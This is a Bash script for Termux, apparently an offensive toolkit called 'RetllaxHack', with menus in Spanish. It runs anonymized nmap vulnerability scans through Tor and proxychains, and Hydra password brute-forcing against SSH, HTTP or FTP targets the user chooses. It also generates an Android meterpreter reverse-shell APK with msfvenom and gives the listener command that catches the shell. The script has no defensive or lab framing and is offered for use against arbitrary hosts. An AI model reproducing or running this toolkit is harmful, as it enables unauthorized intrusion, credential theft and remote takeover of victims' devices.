#!/usr/bin/env bash

# RetllaxHack Shadow + Metasploit (v10.0)
# Versión profesional para Termux - No Root Requerido
# GitHub: https://github.com/tu_usuario/RetllaxHack

# ===== CONFIGURACIÓN RGB =====
function rgb {
  colors=("196" "40" "214" "39" "200" "226")
  echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
}

# ===== BANNER =====
function show_banner {
  clear
  echo
  rgb " ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗ █████╗ ██╗  ██╗"
  rgb "██╔════╝ ██╔════╝╚══██╔══╝██║  ██║╚██╗██╔╝██╔══██╗╚██╗██╔╝"
  rgb "██║  ███╗█████╗     ██║   ███████║ ╚███╔╝ ███████║ ╚███╔╝ "
  rgb "██║   ██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██║ ██╔██╗ "
  rgb "╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║██╔╝ ██╗"
  rgb " ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
  rgb "               SHADOW EDITION + METASPLOIT v10.0"
  echo
  rgb "=== ESCANEO AVANZADO | FUERZA BRUTA | EXPLOITS ==="
  echo
}

# ===== VERIFICAR DEPENDENCIAS =====
function check_deps {
  declare -A tools=(
    ["tor"]="pkg install tor -y"
    ["proxychains"]="pkg install proxychains-ng -y"
    ["nmap"]="pkg install nmap -y"
    ["hydra"]="pkg install hydra -y"
    ["msfconsole"]="pkg install unstable-repo metasploit -y"
  )

  for tool in "${!tools[@]}"; do
    if ! command -v $tool >/dev/null; then
      rgb "[~] Instalando $tool..."
      eval ${tools[$tool]}
    fi
  done

  # Configuración especial para Proxychains
  sed -i 's/^strict_chain/#strict_chain\ndynamic_chain/' $PREFIX/etc/proxychains.conf
  sed -i 's/socks4.*/socks5 127.0.0.1 9050/' $PREFIX/etc/proxychains.conf

  # Iniciar Tor si no está corriendo
  if ! pgrep -x "tor" >/dev/null; then
    rgb "[~] Iniciando Tor..."
    tor --RunAsDaemon 1 --CircuitBuildTimeout 30 --NumEntryGuards 3 &> /dev/null &
    sleep 8
  fi
}

# ===== ESCANEO INTELIGENTE (CORREGIDO) =====
function global_scan {
  read -p "$(rgb "[?] IP/Dominio a escanear: ")" target
  read -p "$(rgb "[?] Puertos (ej: 80,443 o 1-1000): ")" ports

  rgb "[~] Iniciando escaneo en $target..."
  
  # Escaneo principal con verificación mejorada
  log_file="scan_$(date +%Y%m%d_%H%M%S).log"
  proxychains4 -q nmap -Pn -T4 --open -p $ports $target -oN $log_file 2>&1

  # Verificación de resultados
  if grep -q "open" $log_file; then
    rgb "[✔] Puertos abiertos detectados:"
    grep --color "open" $log_file
    
    # Análisis de vulnerabilidades
    open_ports=$(grep "open" $log_file | awk -F'/' '{print $1}' | tr '\n' ',')
    rgb "[~] Analizando vulnerabilidades..."
    proxychains4 -q nmap -Pn --script vuln -p ${open_ports%,} $target >> $log_file 2>&1
    grep --color -E "VULNERABLE|CVE-" $log_file 2>/dev/null || rgb "[!] No se encontraron vulnerabilidades"
  else
    rgb "[!] No se encontraron puertos abiertos"
    
    # Prueba de conectividad manual
    rgb "[~] Realizando prueba de conexión básica..."
    if ping -c 1 $target &> /dev/null; then
      rgb "[⚠️] El host responde pero los puertos están filtrados"
      rgb "[ℹ️] Consejo: Intenta con --scan-delay 5s"
    else
      rgb "[!] Host inalcanzable - Verifica la IP/dominio"
    fi
  fi
}

# ===== HYDRA SHADOW (OPTIMIZADO) =====
function hydra_attack {
  read -p "$(rgb "[?] IP/Dominio: ")" target
  read -p "$(rgb "[?] Usuario (ej: admin): ")" user
  read -p "$(rgb "[?] Ruta al diccionario: ")" wordlist

  if [ ! -f "$wordlist" ]; then
    rgb "[!] Error: El archivo $wordlist no existe"
    return 1
  fi

  rgb "[~] Detectando servicios..."
  service=$(proxychains4 -q nmap -Pn -p- --open $target 2>/dev/null | grep "open" | head -n 1 | awk '{print $3}')
  
  case $service in
    ssh) port=22 ;;
    http|http-proxy) port=80 ;;
    ftp) port=21 ;;
    *) read -p "$(rgb "[?] Puerto manual: ")" port ;;
  esac

  rgb "[~] Atacando $service ($target:$port)..."
  log_file="hydra_$(date +%Y%m%d_%H%M%S).log"
  proxychains4 -q hydra -l $user -P $wordlist -t 4 -s $port $target $service -o $log_file 2>&1

  if grep -q "login:" $log_file; then
    rgb "[✔] Credenciales encontradas:"
    grep --color "login:" $log_file
  else
    rgb "[!] No se encontraron credenciales válidas"
  fi
}

# ===== METASPLOIT (FUNCIONAL) =====
function metasploit_mod {
  # Verificar instalación
  if ! command -v msfconsole >/dev/null; then
    rgb "[!] Metasploit no está instalado"
    read -p "$(rgb "[?] ¿Instalar Metasploit? (1GB) [y/n]: ")" install
    if [[ $install =~ [yY] ]]; then
      pkg install -y unstable-repo metasploit
      pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
      sleep 5
    else
      return 1
    fi
  fi

  # Iniciar PostgreSQL si no está activo
  if ! pgrep postgres >/dev/null; then
    rgb "[~] Iniciando PostgreSQL..."
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
    sleep 5
  fi

  show_banner
  rgb "[!] Módulos Metasploit:"
  rgb "1) Generar Payload Android"
  rgb "2) Buscar Exploits"
  rgb "3) Escanear Red"
  echo
  read -p "$(rgb "[?] Opción: ")" opt

  case $opt in
    1)
      read -p "$(rgb "[?] LHOST (tu IP): ")" lhost
      read -p "$(rgb "[?] LPORT (ej: 4444): ")" lport
      if msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o payload.apk; then
        rgb "[✔] Payload generado: payload.apk"
        rgb "[!] Usa: msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
      else
        rgb "[!] Error al generar payload"
      fi
      ;;
    2)
      read -p "$(rgb "[?] Buscar (ej: Apache): ")" query
      msfconsole -q -x "search $query; exit" || rgb "[!] Error en la búsqueda"
      ;;
    3)
      read -p "$(rgb "[?] IP/Rango (ej: 192.168.1.0/24): ")" target
      msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit" || rgb "[!] Error en escaneo"
      ;;
    *) 
      rgb "[!] Opción no válida"
      ;;
  esac
}

# ===== MENÚ PRINCIPAL =====
function main_menu {
  check_deps
  while true; do
    show_banner
    rgb "1) Escaneo Inteligente"
    rgb "2) Ataque Hydra Shadow"
    rgb "3) Módulo Metasploit"
    rgb "4) Ver Logs Recientes"
    rgb "5) Salir"
    echo
    read -p "$(rgb "[?] Elige una opción: ")" opt

    case $opt in
      1) global_scan ;;
      2) hydra_attack ;;
      3) metasploit_mod ;;
      4) 
        rgb "[📂] Últimos logs:"
        ls -lt scan_*.log hydra_*.log 2>/dev/null | head -5 | awk '{print $9}'
        read -p "$(rgb "[?] Ver log (nombre completo): ")" logfile
        [ -f "$logfile" ] && cat "$logfile" || rgb "[!] Archivo no encontrado"
        ;;
      5)
        pkill -f tor 2>/dev/null
        rgb "[!] Saliendo de RetllaxHack..."
        exit 0
        ;;
      *)
        rgb "[!] Opción no válida"
        sleep 1
        ;;
    esac
    read -p "$(rgb "[?] Presiona Enter para continuar...")"
  done
}

# ===== INICIO =====
show_banner
main_menu
